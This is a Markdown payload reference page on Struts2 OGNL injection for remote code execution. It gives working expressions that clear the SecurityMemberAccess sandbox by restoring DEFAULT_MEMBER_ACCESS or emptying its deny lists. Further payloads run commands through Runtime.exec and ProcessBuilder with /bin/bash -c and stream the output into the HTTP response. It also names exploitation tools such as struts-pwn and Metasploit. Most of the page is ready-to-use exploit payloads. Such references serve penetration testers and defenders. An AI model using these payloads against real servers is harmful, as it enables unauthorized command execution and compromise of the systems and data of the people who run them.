---
title: "OGNL remote code execution: clearing the Struts2 member-access sandbox"
description: "Modern Struts2 sandboxes OGNL with SecurityMemberAccess, so remote code execution first restores member access through the OGNL context, then reaches Runtime and ProcessBuilder."
keywords:
  - OGNL remote code execution
  - Struts2 RCE
  - DEFAULT_MEMBER_ACCESS
  - SecurityMemberAccess bypass
  - ProcessBuilder OGNL
---

# Remote code execution

OGNL can name `java.lang.Runtime` and call its methods, so on an unguarded evaluator a single expression runs a command. Modern Struts2 does not leave it unguarded: evaluation runs under a `SecurityMemberAccess` that denies access to excluded classes and package names, and reflective method calls on `Runtime` or `ProcessBuilder` fail until that restriction is lifted. Remote code execution on a current stack is therefore two moves: restore member access, then call the runtime.

## Restoring member access

The context holds a `MemberAccess` object whose checks gate every reflective call. Replacing it with the permissive default re-enables access to the excluded types:

```
%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS}
```

Where that field cannot be assigned on a given version, the equivalent is to empty the deny lists on the existing `_memberAccess` so nothing remains excluded:

```
%{#m=#_memberAccess,#m.excludedClasses.clear(),#m.excludedPackageNames.clear()}
```

Either form leaves the context able to reflect into `java.lang` for the call that follows. These are version-dependent: the exact field name and whether the collections are mutable vary across Struts2 releases, so the working form is the one that matches the evaluator in front of the sink.

## Reaching the runtime

With member access restored, `@java.lang.Runtime@getRuntime().exec(...)` runs a command. `Runtime.exec(String)` tokenizes on whitespace and uses no shell, so it fits a single program with plain arguments:

```
%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec("id")}
```

Because there is no shell, `$(...)`, pipes, `;`, and redirection are passed as literal argv tokens and do not chain commands. For shell features, build an explicit argument array where the shell is the program and the full command line is one element, and run it through `ProcessBuilder`:

```
%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#cmd=new java.lang.String[]{"/bin/bash","-c","id; uname -a"},new java.lang.ProcessBuilder(#cmd).start()}
```

## Returning output

To read the result into the response rather than firing blind, keep the sandbox-clearing preamble, redirect error into output, and stream the process into an HTTP response writer pulled from the context:

```
%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
#cmd=new java.lang.String[]{"/bin/bash","-c","id"},
#pb=new java.lang.ProcessBuilder(#cmd),
#pb.redirectErrorStream(true),
#proc=#pb.start(),
#out=new java.util.Scanner(#proc.getInputStream()).useDelimiter("\\A").next(),
#resp=@org.apache.struts2.ServletActionContext@getResponse(),
#resp.getWriter().println(#out),
#resp.getWriter().flush()}
```

`redirectErrorStream(true)` folds stderr into the captured stream so failing commands still return a diagnostic, and the `Scanner` with the `\A` delimiter reads the whole output in one token. Pulling the response from `ServletActionContext` writes the result directly to the client even when the value stack result is otherwise discarded.

## Tools

- **Burp Suite**: Repeater to deliver the sandbox-clearing preamble and runtime call.
- **struts-pwn**: PoC tool exercising Struts2 OGNL remote-code-execution vectors.
- **Metasploit Framework**: Struts2 OGNL exploitation modules.

## References

- [Apache Commons OGNL Language Guide](https://commons.apache.org/dormant/commons-ognl/language-guide.html)
- [Apache Struts2 Security](https://struts.apache.org/security/)
- [PayloadsAllTheThings: Java OGNL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings)
